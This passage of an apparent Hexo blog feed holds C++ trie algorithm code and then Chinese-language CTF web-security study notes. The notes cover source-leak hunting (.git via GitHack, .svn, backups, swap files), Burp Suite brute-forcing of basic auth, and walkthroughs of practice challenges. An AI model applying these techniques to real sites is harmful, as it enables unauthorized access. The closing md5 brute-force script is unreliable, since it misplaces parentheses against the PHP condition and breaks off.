class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> ch = str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(trie[p][ch]==<span class="hljs-number">0</span>) trie[p][ch]=++tot;  <span class="hljs-comment">//该字符不存在</span><br>        p = trie[p][ch];<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>search：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)  <span class="hljs-comment">//当前的点即为判断的点</span><br>    &#123;<br>        <span class="hljs-type">int</span> ch = str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>        p = trie[p][ch];<br>        <span class="hljs-keyword">if</span>(p==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>    <span class="hljs-keyword">return</span> end[p];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="前缀统计">前缀统计</h4><p>结尾用cnt代替，有可能重复插入，这里需要统计个数。</p><p>S1~Sn建立trie，检索T字符串，边检索边技术每个节点的cnt。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000010</span>;<br><span class="hljs-type">int</span> trie[N][<span class="hljs-number">26</span>];<br><span class="hljs-type">char</span> str[N];<br><span class="hljs-type">int</span> cnt[N];<br><span class="hljs-type">int</span> tot = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> n, m;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br><span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-type">int</span> ch = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-keyword">if</span> (trie[p][ch] == <span class="hljs-number">0</span>) trie[p][ch] = ++tot;<br>p = trie[p][ch];<br>&#125;<br>cnt[p]++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br><span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-type">int</span> ch = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;<br>p = trie[p][ch];<br><span class="hljs-keyword">if</span> (p == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> res;<br><span class="hljs-keyword">else</span><br>res += cnt[p];<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; str;<br><span class="hljs-built_in">insert</span>(str);<br>&#125;<br><span class="hljs-keyword">while</span> (m--)<br>&#123;<br>cin &gt;&gt; str;<br>cout &lt;&lt; <span class="hljs-built_in">search</span>(str) &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最大异或树">最大异或树</h4><p>所有整数看成32位的二进制数，将A1~A(i-1)插入trie，查找Ai时，按照trie的search,每次<strong>尽量</strong>找与Ai不同的位置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> M = <span class="hljs-number">31</span> * N;  <span class="hljs-comment">//每个数字转换为二进制最多有31位</span><br><span class="hljs-type">int</span> trie[M][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> tot = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">30</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br><span class="hljs-type">int</span> ch = x &gt;&gt; i &amp; <span class="hljs-number">1</span>;  <span class="hljs-comment">//x的二进制表示，取出第i位</span><br><span class="hljs-keyword">if</span> (trie[p][ch] == <span class="hljs-number">0</span>)<br>trie[p][ch] = ++tot;<br>p = trie[p][ch];<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">30</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br><span class="hljs-type">int</span> ch = x &gt;&gt; i &amp; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (trie[p][!ch])     <br>&#123;<br>res = res * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;   <span class="hljs-comment">//求结果</span><br>p = trie[p][!ch];<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>res = res * <span class="hljs-number">2</span>;<br>p = trie[p][ch];<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>cin &gt;&gt; n;<br><span class="hljs-type">int</span> a;<br>cin &gt;&gt; a;<br><span class="hljs-built_in">insert</span>(a);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; a;<br>res = <span class="hljs-built_in">max</span>(res, <span class="hljs-built_in">query</span>(a));<br><span class="hljs-built_in">insert</span>(a);<br>&#125;<br>cout &lt;&lt; res &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最大异或路径">最大异或路径</h4><p>D(x)：表示从根节点到x节点的异或值，D(x) = D(father(x) ) xorweight(father(x),x)；深度遍历求D(x)；</p><p>x到y的路径的异或值为D(x) xor D(y)。</p><p>转换为上题，从D(1) ~ D(N)中挑选两个数使之异或值最大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> R = <span class="hljs-number">2</span> * N;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> M = <span class="hljs-number">31</span> * N;<br><span class="hljs-type">int</span> h[N], ne[R],e[R],w[R], cnt;<br><span class="hljs-type">int</span> trie[M][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> tot = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> d[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> v, <span class="hljs-type">int</span> we)</span></span><br><span class="hljs-function"></span>&#123;<br>e[cnt] = v;<br>w[cnt] = we;<br>ne[cnt] = h[u];<br>h[u] = cnt++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> father, <span class="hljs-type">int</span> xo)</span></span><br><span class="hljs-function"></span>&#123;<br>d[u] = xo;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[u]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>&#123;<br><span class="hljs-type">int</span> j = e[i];<br><span class="hljs-keyword">if</span> (j != father) <span class="hljs-built_in">dfs</span>(j, u, xo^w[i]);  <span class="hljs-comment">//这里father表示发源地（模拟一下即可理解），相当于st数组的作用</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">30</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br><span class="hljs-type">int</span> ch = x &gt;&gt; i &amp; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (trie[p][ch] == <span class="hljs-number">0</span>) trie[p][ch] = ++tot;<br>p = trie[p][ch];<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">30</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br><span class="hljs-type">int</span> ch = x &gt;&gt; i &amp; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (trie[p][!ch])<br>&#123;<br>res = res * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>p = trie[p][!ch];<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>res = res * <span class="hljs-number">2</span>;<br>p = trie[p][ch];<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-built_in">memset</span>(h, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span> h);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i++)<br>&#123;<br><span class="hljs-type">int</span> u, v, we;<br>cin &gt;&gt; u &gt;&gt; v &gt;&gt; we;<br><span class="hljs-built_in">add</span>(u, v, we);<br><span class="hljs-built_in">add</span>(v, u, we);<br>&#125;<br><span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">insert</span>(d[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++)<br>&#123;<br>ans = <span class="hljs-built_in">max</span>(ans, <span class="hljs-built_in">query</span>(d[i]));<br><span class="hljs-built_in">insert</span>(d[i]);<br>&#125;<br>cout &lt;&lt; ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>algorithm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>algorithm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web</title>
    <link href="/2024/12/03/Web/"/>
    <url>/2024/12/03/Web/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="认识漏洞">认识漏洞</h2><p>术语：</p><p>poc：证明漏洞存在；exp：漏洞利用脚本</p><h3 id="漏洞利用方式">漏洞利用方式</h3><ul><li>失能：拒接服务(DOS)</li><li>读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入）</li><li>写入：篡改数据；提权；加密硬盘</li><li>执行：执行命令；内网渗透；反弹shell</li></ul><h3 id="做题思路">做题思路</h3><ol type="1"><li>判断利用的漏洞方式为<strong>读取、写入还是执行</strong>，不能马上确定，从低到高依次挖掘。</li><li>判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑，尝试文件读取；给源码做代码审计。</li><li>寻找敏感数据</li></ol><h2 id="信息泄露">信息泄露</h2><h3 id="信息泄露的类型">信息泄露的类型</h3><ul><li>版本软件信息泄露：</li></ul><p>git，svn，hg，bzr，cvs</p><ul><li>敏感文件信息泄露：</li></ul><p>robots.txt，www.zip，静态文件注释泄露</p><ul><li>配置错误信息泄露：</li></ul><p>DS_Store，WEB.INF，Apache/Nginx错误配置</p><h3 id="信息泄露漏洞利用">信息泄露漏洞利用</h3><h4 id="http头信息泄露">http头信息泄露</h4><p><code>/admin</code>和<code>/admin/</code>区别：</p><p>/admin：访问admin这个文件，没有的话直接返回404，不会寻找索引文件</p><p>/admin/：访问admin目录，会默认访问目录里面的索引文件（index.php，index.html）</p><p>区别访问路由和访问文件：</p><p>/user：访问user路由，如果含有后缀(php，html，asp，jsp)是基于文件(其实也不能明确区别，所见非真)，看后台有没有监听理由？？</p><p>状态码：</p><ul><li>200 正常</li><li>301 302 表示跳转</li><li>400出现不可识别字符</li><li>403表示目录存在，但访问禁止</li><li>404表示文件不存在</li><li>500服务器内部错误</li><li>502转发失败</li></ul><p>network里点开每个包可查看server、状态码、使用时间等信息</p><h4 id="报错信息泄露">报错信息泄露</h4><p>通过报错信息泄露服务器状态</p><h4 id="页面信息泄露">页面信息泄露</h4><p>查看页面源代码、控制台等</p><h4 id="robots.txt敏感文件泄露">robots.txt敏感文件泄露</h4><p>爬虫协议，规定哪些内容不能访问（正规的搜索引擎爬虫都会遵守），但没有任何强制约束力。</p><p>格式：</p><p>User-agent：每个搜索引擎的爬虫标识</p><p>Disallow：不允许访问哪些链接</p><p>Disallow：.......</p><h4 id="git文件泄露">.git文件泄露</h4><p>版本控制系统（版本号）</p><p>githack脚本利用(windows)：[遇到403禁止时，可以尝试]</p><p>（原理）解析.git/index文件，找到所有的：（文件名，文件sha1）;接着去.git/objects/文件夹下载对应文件；zlib解压文件，按原始的结构写入源代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\GitHack.py -u <span class="hljs-string">&quot;https://xxxx/.git/&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h4 id="搜索引擎文件泄露">搜索引擎文件泄露</h4><p>(百度)<code>intitle:xx后台登录</code>标题</p><p>(fofa网络安全搜索引擎)<code>title="xx"文件上传</code>标题</p><h3 id="总结">总结</h3><ol type="1"><li><code>robots.txt</code>泄露</li><li><code>.git/</code><code>.svn/</code>泄露（访问目录出现403访问禁止）</li><li>源代码泄露、http头泄露</li><li><strong>任意文件下载造成的信息泄露</strong></li><li>开源社区信息泄露，例如：泄露项目名称，整个项目代码可以在github等找到</li><li>使用vim异常退出，造成类似<code>index.php.swp</code>临时文件</li></ol><h2 id="burpsuite与爆破">Burpsuite与爆破</h2><p>爆破-&gt;防止：验证码；</p><p>8位字符-&gt;76亿年，不到万不得已不用；</p><ol type="1"><li>单个位置：sniper</li><li>两个位置：cluster bomb，两个simplist导入两个payload</li><li>http认证爆破：输入的字符经过编码处理，例如admin:123456(经过base64编码)：payload导入password字典，在payload处理里加入前缀和编码，取消url编码</li></ol><h2 id="练习">练习</h2><h3 id="信息收集">信息收集</h3><h4 id="web1">web1</h4><p>源码</p><h4 id="web2">web2</h4><p>无法查看源码-&gt;开发者工具；</p><p>在URL前加上<code>view-source:</code></p><h4 id="web3">web3</h4><p>抓包-&gt;响应；</p><p>或查看请求头和响应头，在响应头可找到flag</p><h4 id="web4">web4</h4><p>/robots.txt</p><h4 id="web5">web5</h4><p>phps源码泄露-&gt;/index.phps</p><h4 id="web6">web6</h4><p>解压源码-&gt;/www.zip，得到文件名，url访问</p><h4 id="web7">web7</h4><p>版本控制-&gt;/.git/</p><h4 id="web8">web8</h4><p>版本控制-&gt;/.svn/</p><h4 id="web9">web9</h4><p>vim非正常退出，产生<code>index.php.swp</code>文件</p><h4 id="web10">web10</h4><p>cookie信息泄露，URL解码；</p><p>查看请求头的cookie</p><h4 id="web11">web11</h4><p>域名信息泄露，使用 https://zijian.aliyun.com/进行域名查询；</p><p>nslookup进行域名查询，命令：<code>nslookup -query=any (hostname)</code></p><h4 id="web12">web12</h4><p>访问robots.txt文件发现后台地址，进入后台登录，用户名为admin，密码为网站底部的数字</p><h4 id="web13">web13</h4><p>技术文档，网页底部document连接，发现敏感信息</p><h4 id="web14">web14</h4><p>editor信息泄露，访问url/editor/发现编辑器，在flash上传按键上发现文件空间，可爆出目录，</p><p>flag在<code>/var/www/html/nothinghere/fl000g.txt</code>中，构造<code>url/nothinghere/fl000g.txt</code>访问。</p><h4 id="web15">web15</h4><p>邮箱信息泄露，访问后台，忘记密码，查询qq号，可知密保答案</p><h4 id="web16">web16</h4><p>探针：</p><p><em>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。</em><em>比如查看服务器支持什么，不支持什么，空间速度等等状况！</em></p><p>访问<code>url/tz.php</code>，查看phpinfo即可获得flag</p><h4 id="web17">web17</h4><p>备份的sql文件，访问<code>url/backup.sql</code></p><h4 id="web18">web18</h4><p>查看js文件，发现分数大于100会出现窗口编码，unicode解码</p><h4 id="web19">web19</h4><p>查看源码，发现用户名密码，post提交即可</p><h4 id="web20">web20</h4><p>mdb文件泄露，访问<code>url/db/db.mdb</code></p><h3 id="爆破">爆破</h3><h4 id="web21">web21</h4><p>加前缀<code>admin:</code>，以及加编码方式<code>base64</code>，去掉url编码</p><h4 id="web22">web22</h4><p>爆破子域名，layer域名挖掘机</p><h4 id="web23">web23</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);         <span class="hljs-comment">//引入php文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]))&#123;   <span class="hljs-comment">//检查url中是否包含token参数</span><br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]);    <span class="hljs-comment">//将输入的参数转换为md5值</span><br>    <span class="hljs-comment">//substr(xx,1,1)字符截取第二个字符，intval转换为整数</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) ===<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))+<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>))+<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))/<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">31</span>,<span class="hljs-number">1</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>md5后需要满足一定特性，爆破两位数字加字母的组合，python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-built_in">dict</span>=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>:<br>        b = <span class="hljs-built_in">str</span>(i)+<span class="hljs-built_in">str</span>(j)<br>        mb = hashlib.md5(b.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()    <span class="hljs-comment">#以十六进制字符串方式存储</span><br>        <span class="hljs-keyword">if</span> mb[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]==mb[<span class="hljs-number">14</span>:<span class="hljs-number">15</span>] <span class="hljs-keyword">and</span> mb[<span class="hljs-number">14</span>:<span class="hljs-number">15</span>]==mb[<span class="hljs-number">17</span>:<span class="hljs-number">18</span>]:<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">int</span>(mb[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>])+<span class="hljs-built_in">int</span>(mb[<span class="hljs-number">14</span>:<span class="hljs-number">15</span>])+<span class="hljs-built_in">int</span>(mb[<span class="hljs-number">17</span>:<span class="hljs-number">18</span>])/<span class="hljs-built_in">int</span>(mb[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]))==<span class="hljs-built_in">int</span>(mb[<span class="hljs-number">31</span>:<span class="hljs-number">32</span>]):<br>                <span 